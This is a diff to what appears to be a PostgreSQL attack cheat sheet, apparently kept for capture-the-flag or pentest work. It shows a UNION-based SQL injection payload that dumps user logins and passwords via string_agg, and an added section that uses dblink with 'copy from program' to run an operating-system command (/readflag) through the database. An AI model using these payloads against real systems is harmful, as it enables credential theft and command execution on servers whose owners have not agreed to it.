@@ -1,7 +1,6 @@
 # postgres
 
-# SQLi-fu
-
+# sqli
 * fast exploitation in PosgreSQL >= 9.0 using string_agg function
 id=-1 union select null,string_agg(login||chr(58)||pass,chr(44)) from users;
 id |              news
@@ -57,3 +56,9 @@ Enter it again:
 
 $ createdb -O ezpublish_user -U postgres ezpublish_db
 
+# shell commands
+create table blah(d text);
+select dblink_connect('heh','host=0 dbname=postgres user=postgres password=xxx')
+select dblink_exec('heh','copy blah from program ''/readflag''');
+select * from blah;
+select dblink_disconnect('heh');
